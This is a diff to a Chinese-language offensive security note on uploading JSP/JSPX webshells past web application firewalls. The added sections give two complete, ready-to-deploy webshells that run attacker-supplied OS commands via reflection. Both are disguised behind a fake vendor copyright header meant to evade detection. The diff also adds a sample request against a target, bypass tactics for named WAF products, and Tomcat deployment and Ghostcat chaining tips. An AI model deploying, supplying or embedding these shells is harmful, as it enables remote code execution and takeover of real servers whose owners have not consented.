@@ -99,6 +99,70 @@ JSPX 是 XML 风格的 JSP 表示形式，某些过滤器只拦截固定标签�
 - 标签前缀可自定义
 - 过滤器若只匹配 `jsp:scriptlet` 字面值，可能被绕过
 
+## 完整 WebShell 模板
+实战中最常用的组合拳：**脏数据头 + EL 执行版 jspx**。整个文件不出现 `<%`、`jsp:scriptlet`、`ProcessBuilder` 等高危字面量，可直接落盘使用。
+
+```xml
+<!--
+  =====================================================================
+  Example Corp - Timeline Widget v2.4.1 (build 20260908)
+  Copyright (c) 2026 Example Corp. All rights reserved.
+  本文件为系统公共时间轴渲染组件，请勿删除或修改。
+  =====================================================================
+  （以上大段版权注释即“脏数据头”：
+   用于稀释 WAF 采样窗口内的特征密度，掩盖后面的 EL 表达式）
+-->
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+    <jsp:directive.page contentType="text/html;charset=UTF-8"/>
+    <jsp:directive.page session="false"/>
+    <jsp:text>
+        ${pageContext.setAttribute("s", pageContext.request.getClass().forName("java.util.Scanner").getConstructor(pageContext.request.getClass().forName("java.io.InputStream")).newInstance(pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec(pageContext.request.getParameter("c")).getInputStream()).useDelimiter("\\A").next())}
+        ${pageContext.getAttribute("s")}
+    </jsp:text>
+</jsp:root>
+```
+
+使用方式：
+
+```http
+GET /upload/timeline.jspx?c=whoami HTTP/1.1
+Host: target.com
+```
+
+要点解析：
+- 免杀面：无 `<%`，无 `jsp:scriptlet`；EL 链路里 `Runtime`、`getRuntime` 等只以 `forName` / `getMethod` 的字符串参数形式出现，单关键字规则通常拦不住
+- 回显：`Scanner(InputStream).useDelimiter("\\A").next()` 把命令输出整段读成字符串；先 `setAttribute` 存结果、再 `getAttribute` 输出，两步分离进一步降低特征密度
+- 兼容性：只依赖 JDK 类（`Runtime` / `Scanner` / `InputStream`）与 `pageContext` 隐含对象，Tomcat 7/8/9/10 通用（Tomcat 10 的 javax → jakarta 迁移不影响）
+- 局限：`exec(String)` 单参数版按空格分词，不支持管道与重定向；需要 shell 特性时改用 `new String[]{"/bin/sh","-c",cmd}` 风格的数组调用，或直接换冰蝎 / 哥斯拉内存马
+
+变体：自定义前缀 scriptlet 版（应对只拦 `jsp:scriptlet` 字面量 + 关键字混淆的场景）：
+
+```xml
+<!-- （脏数据头注释块同上，此处省略） -->
+<x xmlns:x="http://java.sun.com/JSP/Page" version="2.0">
+    <x:directive.page contentType="text/html;charset=UTF-8"/>
+    <x:scriptlet>
+        // 字符串拼接规避 Runtime / getRuntime 字面量；Scanner 读流回显
+        Object rt = Class.forName("java.lang." + "Runtime").getMethod("get" + "Runtime").invoke(null);
+        Process p = (Process) rt.getClass().getMethod("exec", String.class).invoke(rt, request.getParameter("c"));
+        java.util.Scanner sc = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
+        out.println(sc.hasNext() ? sc.next() : "no output");
+    </x:scriptlet>
+</x:root>
+```
+
+## WAF 产品对抗差异
+不同产品对 JSP 上传的检测重心不同，先识别产品再选绕过方向：
+- 安全狗：内容侧重点查经典 JSP 特征（`<%`、`Runtime`、`request.getParameter` + `exec` 组合），对 multipart 文件名的检查相对宽松；大体积脏数据稀释 + EL 变形通常即可通过。
+- D 盾：本地特征码引擎，对 PHP/ASP 一句话覆盖最全，JSP 检测相对薄弱，基本只认固定字面量；对 jspx、自定义命名空间前缀、EL 反射链的变形支持很弱。
+- 阿里云盾：云端规则 + 机器学习双引擎，对 multipart 报文结构本身敏感（boundary 混淆、filename 大小写变形、多个 Content-Disposition 等畸形格式可能直接触发拦截或解析差异），文件名与内容双重评分；对变形 WebShell 识别较强，建议转向加密流量内存马（冰蝎 / 哥斯拉）方向。
+
+## Tomcat 版本解析差异
+- Tomcat 7/8/9：`conf/web.xml` 默认将 JspServlet 映射到 `*.jsp` 与 `*.jspx`，两种后缀默认都解析；EL 方法调用自 Tomcat 6（JSP 2.1）起可用，上文 EL 模板在这些版本通用。
+- Tomcat 10/10.1：Jakarta EE 9+ 命名空间从 `javax.*` 迁移到 `jakarta.*`，依赖 `javax.servlet.*` 的老 WebShell 会直接 500；EL 模板只用隐含对象和 JDK 类，不受影响。
+- `/WEB-INF` 与 war 部署要点：`/WEB-INF/` 下的 JSP 受容器保护、无法通过 URL 直接访问，WebShell 必须落在 webapp 根或可访问子路径；若能写入 `webapps` 目录，上传 `.war` 会被 Tomcat 自动解压部署成新应用（与 manager 弱口令部署 war 同一条利用链）。
+- AJP 关联：Tomcat AJP 文件包含漏洞（Ghostcat，CVE-2020-1938）可把上传的任意类型文件（如 jpg）按 JSP 包含执行，与上传漏洞天然联动，详见 [EXP-Vul-Index.md](./EXP-Vul-Index.md) 中间件 Tomcat 条目。
+
 ## 实战排查思路
 ### 1. 先确认解析链
 重点看：
@@ -148,3 +212,7 @@ JSPX 是 XML 风格的 JSP 表示形式，某些过滤器只拦截固定标签�
 ## Reference
 1. [记一次绕过 waf 的任意文件上传](https://xz.aliyun.com/t/11337)
 2. [普通 EL 表达式命令回显的简单研究](https://forum.butian.net/share/886)
+3. [Ghostcat（CVE-2020-1938）漏洞分析 - 长亭科技](https://www.chaitin.cn/zh/ghostcat)
+4. [tennc/webshell - WebShell 样本收集（含 jsp/jspx）](https://github.com/tennc/webshell)
+5. [threedr3am/JSP-Webshells](https://github.com/threedr3am/JSP-Webshells)
+6. [Tomcat Jasper HowTo（JSP 引擎官方文档）](https://tomcat.apache.org/tomcat-9.0-doc/jasper-howto.html)
